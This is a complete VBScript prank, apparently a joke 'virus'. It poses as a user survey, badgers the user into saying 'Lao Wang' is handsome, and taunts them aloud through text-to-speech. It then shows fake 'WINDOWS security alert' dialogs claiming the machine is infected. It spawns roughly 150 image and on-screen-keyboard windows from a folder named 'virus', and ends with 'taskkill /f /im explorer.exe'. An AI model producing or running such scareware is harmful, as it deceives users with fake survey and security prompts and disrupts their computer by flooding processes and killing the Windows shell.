dim i,t,flag,z,g,y
g=1
g=int(g)
flag="1"
z=1
flag=int(flag)
z=int(z)
msgbox"为了收集用户信息，使产品变得更好，我们将问你一个问题，希望你能积极配合！！！"
t="就问你一个问题，老王帅还是你帅，别怪我没提醒你，你的回答将会影响你一生"
i=inputbox(t)
do while i<>"老王" and i<>"我"
if z=1 then
i=inputbox("请用老王或我来回答")
z=2
else
i=inputbox("你瞎啊，说了请用老王或我来回答")
end if
loop
if i="老王"  then
msgbox"嗯，不错，小伙子，有眼光啊，但是你知道的太多了！！！"
elseif i="我" then
msgbox"别怪我没提醒你啊！再给你最后一次机会，如果再不说实话的话，后果自负"
i=inputbox("到底谁帅")
end if
if i<>"老王" then
msgbox("你玩完了，你等一下叫老王也没用了，除非你对老王说：老王你最帅了")
dim k
set k=createobject("sapi.spvoice")
k.speak "你玩完了，你等一下叫老王也没用了，除非你对老王说：老王你最帅了"
end if
do
msgbox("你现在要对你的谎言负责，你是关不掉我的，关机也没用，除非你对老说出这句话")
dim m
set m=createobject("sapi.spvoice")
m.speak "老王好帅啊"
g=g+1
if g=4 then
msgbox"我知道老王很帅，你很喜欢听这句话，但是你能不能不要再按下去了，没有用的，如果你再按下去的话，你的电脑会中病毒的"
g=g+1
end if
if g=5 then
exit do
end if
loop
dim o
for o=1 to 3
msgBox"你的电脑遭病毒破坏，是否尝试修复?" ,vbYesNo,"WINDOWS安全警报"
next
set y=createobject("wscript.shell")
y.run"d:\病毒\01.mp3"
dim p
set p=createobject("wscript.shell")
do while g<150
randomize
o=int((6*rnd)+1)
g=g+1
select case o
case 1
p.run "d:\病毒\1.jpg"
case 2
p.run "d:\病毒\2.jpg"
case 3
p.run "d:\病毒\3.jpg"
case 4
p.run "d:\病毒\4.jpg"
case 5
p.run "osk"
p.run "d:\病毒\5.jpg"
case 6
p.run"d:\病毒\6.jpg"
end select
loop
p.run "taskkill /f /im explorer.exe"